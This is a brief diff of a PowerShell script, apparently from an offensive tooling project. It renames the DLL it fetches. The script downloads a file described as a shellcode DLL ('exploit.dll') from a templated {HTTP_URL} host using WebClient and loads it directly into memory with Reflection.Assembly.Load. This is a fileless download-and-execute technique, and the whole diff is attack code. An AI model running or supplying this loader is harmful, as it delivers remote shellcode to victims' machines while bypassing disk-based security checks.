@@ -1,6 +1,5 @@
-
 #exploit.dll should be the [DLL Shellcode - Invokable] project artifact. Shellcode_Invokable.dll
-$data = (New-Object System.Net.WebClient).DownloadData('{HTTP_URL}/sc-invokable.dll')
+$data = (New-Object System.Net.WebClient).DownloadData('{HTTP_URL}/call-invokable.dll')
 
 $assem = [System.Reflection.Assembly]::Load($data)
 
